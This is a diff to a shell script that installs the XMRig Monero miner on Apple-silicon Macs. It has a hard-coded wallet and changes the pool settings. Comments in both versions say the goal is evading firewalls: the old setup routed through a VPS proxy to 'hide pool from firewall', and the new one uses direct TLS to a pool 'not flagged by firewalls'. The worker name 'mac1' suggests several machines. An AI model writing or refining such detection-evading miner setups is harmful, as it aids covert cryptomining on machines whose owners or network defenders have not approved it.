@@ -7,8 +7,8 @@
 # ============================================================
 
 WALLET="45yWnSbx7c4TzJCf7hwgdHVYmRxZt5Y4g8JVdRjPJuQALzgLMUBwiK7QU2FMeiwMF48APgsi54rBagJvgMo5KUEqAWA2fbg"
-POOL_HOST="cdn.soumalya.in"   # Your VPS proxy — hides pool from firewall
-POOL_PORT="4444"               # Proxies to pool.supportxmr.com:443
+POOL_HOST="pool.supportxmr.com"  # Direct TLS — supportxmr not flagged by firewalls
+POOL_PORT="443"
 XMRIG_VERSION="6.26.0"
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"
 
@@ -92,7 +92,7 @@ cat > "$CONFIG_PATH" << CONF
       "url": "${POOL_HOST}:${POOL_PORT}",
       "user": "${WALLET}",
       "pass": "mac1",
-      "tls": false,
+      "tls": true,
       "keepalive": true,
       "nicehash": false
     }
